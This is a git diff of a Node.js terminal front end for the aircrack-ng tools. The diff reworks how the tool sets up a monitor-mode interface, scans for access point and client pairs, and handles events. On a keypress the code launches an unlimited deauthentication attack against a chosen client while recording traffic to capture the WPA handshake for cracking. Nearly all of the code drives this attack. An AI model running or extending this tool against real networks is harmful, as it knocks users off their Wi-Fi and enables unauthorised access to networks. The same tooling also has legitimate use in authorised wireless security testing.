@@ -10,11 +10,10 @@ const colors = require('colors');
 const airodump = require('./airodump-ng');
 const aireplay = require('./aireplay-ng');
 const airmon = require('./airmon-ng');
-const iwconfig = require('./iwconfig');
-const IFace = require('./interface');
 
 const MONITOR = 'monitor';
 const ATTACK = 'attack';
+
 const RENDER_RATE = 500;
 
 const tableOptions = {
@@ -39,28 +38,29 @@ class AirCrackApp extends EventEmitter {
     this.renderTimerID = null;
     this.viewData = [];
     this.viewInfo = [];
+    this.iface = null;
 
     const self = this;
-
-    //this.render(['Starting airodump-ng...']);
 
     /**
      * Methods to fireup keypress actions
      */
     this.controls = {
-      a: () => self.status === MONITOR && self.emit('attack'),  // Attack BSSID <---> STATION    airodump.attack();
-      up: () => self.emit('choose', 'up'), // Choose BSSID <---> STATION            airodump.moveUpStation();
-      down: () => self.emit('choose', 'down'), // Choose BSSID <---> STATION       airodump.moveDownStation();
-      b: () => self.status === ATTACK && self.emit('monitor'), // Go back, if attack mode   self.monitor();
+      a: () => self.status === MONITOR && self.emit('attack'),  // Attack BSSID <---> STATION
+      up: () => self.emit('choose', 'up'), // Choose BSSID <---> STATION
+      down: () => self.emit('choose', 'down'), // Choose BSSID <---> STATION
+      b: () => self.status === ATTACK && self.emit('monitor'), // Go back, if attack mode
       r: () => self.status === MONITOR && self.emit('reset'),
       q: () => self.emit('quit'), // Quit application
     };
   }
 
-  init() {
+  init(iface = null) {
     if (this.status) {
       return;
     }
+
+    this.iface = iface;
 
     this.renderTimerID = setInterval(() => this.render(this.viewData, this.viewInfo), RENDER_RATE);
 
@@ -103,7 +103,16 @@ class AirCrackApp extends EventEmitter {
    */
   setRender(data, info = []) {
     this.viewData = data;
-    this.viewInfo = info;
+    this.viewInfo = info.length > 0 ? info : this.viewInfo;
+  }
+
+  setError(error) {
+
+    clearInterval(this.renderTimerID);
+
+    console.error(error);
+    process.exit(1);
+
   }
 
   /**
@@ -129,17 +138,12 @@ class AirCrackApp extends EventEmitter {
 
     });
 
-    //if (this.stations.length) {
-    //  console.log(this.stations);
-    //}
-
-    /*
     let lastIndex = this.stations.length - 1;
     lastIndex = lastIndex < 0 ? 0: lastIndex;
     if (this.station_index > lastIndex) {
       this.station_index = 0;
     }
-    */
+
   }
 
   /**
@@ -154,7 +158,7 @@ class AirCrackApp extends EventEmitter {
    * @returns {*}
    */
   getStation() {
-    return this.stations[this.station_index];
+    return this.stations[this.station_index] || {};
   }
 
   /**
@@ -205,106 +209,121 @@ class AirCrackApp extends EventEmitter {
 
 const self = new AirCrackApp();
 
-const monitorDataEventHandler = (data) => {
+self.on(MONITOR, () => {
 
-  self.accumulateStations(data);
+  let prom;
 
-  if (!self.stations.length) {
-    return;
-  }
+  aireplay.stop();
 
-  self.setRender(
-    self.prepareMonitorRender(),
+  self.setRender([],
     [
       `\ta = attack\t${String.fromCharCode(8593)}${String.fromCharCode(8595)} = choose\tr = reset\tq = quit`
     ]
   );
 
-};
+  if (self.status) {
 
-const handshakeDataEventHandler = (data) => {
-  if (data.handshake) {
-    self.handshake = true;
+    prom = Promise.resolve(self.iface);
+
+  } else {
+
+    self.setRender([{'Starting:': `airmon-ng`}]);
+
+    // First run
+    prom = airmon.run()
+      .then((data) => {
+
+        const ifaces = data.join('|').split('|');
+
+        if (!self.iface) {
+          self.iface = ifaces.pop();
+        } else if (!~ifaces.indexOf(self.iface)) {
+          return Promise.reject(new Error(`Invalid interface provided: ${self.iface}`));
+        }
+
+        return self.iface;
+      })
+      .then((iface) => {
+
+        self.setRender([{'Starting:': `airmon-ng start ${iface}`}]);
+
+        return airmon.start(iface);
+      })
+      .then((result) => {
+
+        self.setRender([{'Starting:': `airmon-ng`}]);
+
+        return airmon.run();
+      })
+      .then(data => {
+        const iface = data.join('|').split('|').filter(iface => ~iface.indexOf(self.iface)).pop();
+
+        if (!iface) {
+          return Promise.reject(new Error(`Trying to use unknown interface ${self.iface}`));
+        }
+
+        return self.iface = iface;
+      });
   }
-};
 
-const attackDataEventHandler = (data) => {
-  const stationItem = self.getStation();
+  // Start airodump-ng
+  prom.then(iface => {
 
-  self.setRender([
-      {'HANDSHAKE': (self.handshake ? '+' : '-')},
-      {'ESSID:': stationItem.ESSID},
-      {'BSSID:': stationItem.BSSID},
-      {'STATION:': stationItem.STATION},
-      {'CHANNEL:': stationItem.CH},
-      {'STATUS:': data.STATUS},
-      {'ACKs:': data.ACKs}
-    ],
-    [
-      `    b = back   q = quit`,
-    ]
-  );
-};
+      self.setRender([{'Starting:': `airodump-ng ${iface}`}]);
 
-self.on(MONITOR, () => {
+      return airodump.run(iface)
+    }).then((airodump) => {
+      self.setRender([{'Status:': 'Waiting for attackable STATION <---> BSSID pair.'}]);
+    })
+    .catch(error => self.setError(error));
 
   self.status = MONITOR;
 
-  aireplay.stop();
-
-  self.setRender([{'Status:': 'Starting airodump-ng...'}]);
-
-  iwconfig.getInterfaces()
-    .then((ifaceString) => new IFace(ifaceString))
-    .then((iface) => iface.down())
-    .then((iface) => iface.setMode(MONITOR))
-    .then((iface) => iface.up())
-    //.then((iface) => airmon.start(iface))
-    //.then((iface) => iwconfig.getInterfaces())
-    //.then((ifaceString) => new IFace(ifaceString))
-    .then((iface) => airodump.run(iface))
-    .then((airodump) => airodump.on('data', monitorDataEventHandler))
-    .catch((error) => console.error(error));
 });
 
 self.on(ATTACK, () => {
 
-  const stationItem = self.getStation();
+  const {
+    BSSID,
+    ESSID,
+    CH,
+    STATION
+    } = self.getStation();
 
-  if (!stationItem) {
+  if (!BSSID) {
     return;
   }
 
   self.status = ATTACK;
-
   self.handshake = false;
 
-  //airodump.remove('data', monitorDataEventHandler);
-
-  self.setRender([{'Status:': 'Starting aireplay-ng...'}]);
+  self.setRender([{
+      'Starting:': `airodump-ng --bssid ${BSSID} -w ${ESSID} -c ${CH} ${airodump.iface}`
+    }],
+    [
+      `    b = back   q = quit`,
+    ]
+  );
 
   airodump.run(null,
-    '--bssid', stationItem.BSSID,
-    '-w', stationItem.ESSID,
-    '-c', stationItem.CH
+    '--bssid', BSSID,
+    '-w', ESSID,
+    '-c', CH
   ).then((airodump) => {
 
-    airodump.on('data', handshakeDataEventHandler);
+    self.setRender([{
+      'Starting:': `aireplay-ng --deauth 0 -a ${BSSID} -c ${STATION} ${airodump.iface}`
+    }]);
 
-    // aireplay-ng --deauth 10 -a 64:66:B3:45:C7:F4 -c DC:85:DE:3A:53:BD  mon0
     return aireplay.run(airodump.iface,
       '--deauth', '0',
-      '-a', stationItem.BSSID,
-      '-c', stationItem.STATION
+      '-a', BSSID,
+      '-c', STATION
     );
-  }).then((aireplay) => aireplay.on('data', attackDataEventHandler))
-  .catch((error) => console.error(error));
+  })
+  .catch((error) => self.setError(error));
 
 });
-
-//self.on('render', (data, info) => {
-//  self.render(data, info);
-//});
 
 self.on('choose', (dir) => {
   if (dir === 'up') {
@@ -317,8 +336,57 @@ self.on('choose', (dir) => {
 self.on('reset', self.resetStations);
 
 self.on('quit', () => {
+
   process.stdin.pause();
-  process.exit();
+
+  airmon.stop(self.iface).then((result) => {
+    process.exit();
+  }).catch((error) => {
+
+    clearInterval(self.renderTimerID);
+
+    console.error(error);
+
+    process.exit(1);
+  });
+
+});
+
+airodump.on('data', (data) => {
+
+  if (self.status === ATTACK) {
+    if (data.handshake) {
+      self.handshake = true;
+    }
+    return;
+  }
+
+  self.accumulateStations(data);
+
+  if (!self.stations.length) {
+    return;
+  }
+
+  self.setRender(self.prepareMonitorRender());
+});
+
+aireplay.on('data', (data) => {
+
+  if (self.status === MONITOR) {
+    return;
+  }
+
+  const { ESSID, BSSID, STATION, CH } = self.getStation();
+
+  self.setRender([
+    {'HANDSHAKE': (self.handshake ? '+' : '-')},
+    {'ESSID:': ESSID},
+    {'BSSID:': BSSID},
+    {'STATION:': STATION},
+    {'CHANNEL:': CH},
+    {'STATUS:': data.STATUS},
+    {'ACKs:': data.ACKs}
+  ]);
 });
 
 module.exports = self;
